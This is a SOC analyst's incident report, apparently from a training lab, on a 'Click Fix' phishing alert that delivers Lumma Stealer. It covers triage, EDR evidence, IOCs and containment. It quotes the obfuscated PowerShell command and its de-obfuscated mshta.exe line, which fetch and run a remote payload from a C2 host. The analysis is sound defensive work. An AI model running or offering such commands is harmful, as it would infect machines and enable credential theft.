# 🚨 Incident Report: SOC338 – Lumma Stealer ("Click Fix" Phishing)

![Severity: High](https://img.shields.io/badge/Severity-High-red.svg)
![Status: Closed](https://img.shields.io/badge/Status-Closed-brightgreen.svg)
![Verdict: True Positive](https://img.shields.io/badge/Verdict-True%20Positive-orange.svg)

---

## 📌 Executive Summary
On the monitored host `Dylan-PC`, an incident alert was triggered following the delivery and interaction with a phishing email masquerading as a Windows 11 upgrade notice. Investigation confirmed that user `dylan@letsdefend.io` clicked the phishing link and executed a clipboard-pasted PowerShell command (a "Click Fix" social engineering tactic). The execution spawned `mshta.exe` to retrieve and execute a remote file from a known C2 server (`overcoatpassably.shop`). The endpoint was immediately isolated, and credentials were reset.

---

## 1. Scenario
* **Event ID / Alert:** SOC338 – Phishing / Lumma Stealer ("Click Fix" Tactic)
* **Target User:** `dylan@letsdefend.io`
* **Affected Host:** `Dylan-PC`
* **Attacker Infrastructure:**
  * **Sender Address:** `update@windows-update.site`
  * **SMTP Server IP:** `132.232.40.201`
  * **Phishing URL:** `https://windows-update.site/`
  * **C2 / Payload URL:** `https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4`

---

## 2. Initial Triage
* **Email Security Inspection:** Analyzed Event ID 316 headers. The email delivery status was marked as **`Allowed`**, confirming the malicious email successfully bypassed initial perimeter filters and reached the target inbox.
* **Threat Intelligence Verification:** Queried reputation databases (VirusTotal) for sender IP (`132.232.40.201`) and phishing domain (`windows-update.site`). Both were identified as newly registered domains (NRDs) associated with malicious activity.
* **Triage Decision:** Because delivery was confirmed (`Allowed`), the investigation immediately pivoted to Endpoint Security (EDR) on `Dylan-PC` to evaluate potential user interaction.

---

## 3. Investigation & Forensic Evidence

### 🌐 Web Browser Activity
Browser history logs on `Dylan-PC` confirmed active user interaction:
* **Timestamp:** `23:26:08`
* **Action:** User navigated directly to `https://windows-update.site/` via the "UPDATE NOW" button in the phishing email.

### 💻 Process Execution (EDR Analysis)
Process execution logs captured the execution of a clipboard-based "Click Fix" payload:
* **Timestamp:** `23:26:32`
* **Process Path:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
* **Executed Command:**
  ```powershell
  powershell -Command ('ms]]]ht]]]a]]].]]]exe [https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4](https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4)' -replace ']')

Command De-obfuscationThe PowerShell command used string replacement (-replace ']') to stripped out bracket characters, effectively reconstituting and executing:DOSmshta.exe [https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4](https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4)
📡 Network Connection EvidenceEDR network connection logs confirmed outbound HTTP communication initiated by mshta.exe connecting to overcoatpassably.shop at 23:26:32 to download and execute maloy.mp4.

4. Verdict & Determination
Final Verdict: True Positive (TP)
Justification: Host-level forensic evidence confirms successful delivery, link navigation, payload de-obfuscation, process execution, and outbound command-and-control (C2) communication.

Sender IP: 132.232.40.201 — Inbound phishing mail server
Phishing Domain: windows-update.site — Fake update landing page
Phishing URL: [https://windows-update.site/](https://windows-update.site/) — URL embedded in phishing email
C2 Domain: overcoatpassably.shop — Malware host / C2 server
Payload URL: [https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4](https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4) — Payload executed via mshta.exe
Sender Email: update@windows-update.site — Spoofed sender address

5. Actions Taken
Host Containment: Network-isolated Dylan-PC via EDR to prevent lateral movement and terminate active C2 sessions.
Credential Protection: Forced password reset and invalidated active session tokens for dylan@letsdefend.io.
Blocklist Enforcement: Added IP 132.232.40.201, windows-update.site, and overcoatpassably.shop to firewalls, DNS filters, and secure web gateways.
Remediation Order: Escalated host Dylan-PC to Tier 2 IR for full malware eradication and disk re-imaging.

6. Lessons Learned & Recommendations
Detection Gap: Attackers bypassed traditional payload downloads by leveraging social engineering to force clipboard execution ("Click Fix") using native binaries (PowerShell.exe and mshta.exe).
Email Gateway Policy: Update inbound mail rules to score newly registered domains (NRDs) more strictly and flag/quarantine emails containing interactive clipboard prompts.
Endpoint Hardening: Deploy Attack Surface Reduction (ASR) rules to prevent PowerShell from launching child processes like mshta.exe, or block mshta.exe execution where not strictly required by business applications.
